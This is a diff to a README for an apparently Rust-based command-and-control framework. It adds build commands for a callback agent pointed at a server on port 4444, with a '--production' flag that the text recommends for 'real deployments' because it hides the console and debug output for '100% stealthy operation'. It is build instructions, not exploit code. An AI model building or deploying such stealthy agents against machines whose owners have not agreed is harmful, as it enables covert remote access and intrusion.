@@ -157,13 +157,24 @@ For detailed architecture documentation, see [Architecture Guide](docs/ARCHITECT
 cd builder
 cargo run --release -- encrypt-module
 
-# 3. Build agent
-cargo run --release -- build-agent --name agent1 --server 192.168.1.10:4444
+# 3. Build agent (choose mode)
+# Development mode (with console & debug output)
+cargo run --release -- build-agent --name agent-dev --server 192.168.1.10:4444
+
+# Production mode (stealthy, no console, no debug output)
+cargo run --release -- build-agent --name agent-prod --server 192.168.1.10:4444 --production
 
 # 4. Build server
 cd ../c2r2-server
 cargo build --release
 ```
+
+**📖 Build Modes:** See [BUILD.md](BUILD.md) for detailed documentation on development vs production builds.
+
+⚠️ **Important**: Always use `--production` flag for real deployments to ensure stealth:
+- ✅ No console window
+- ✅ No debug output
+- ✅ 100% stealthy operation
 
 ### Running
 
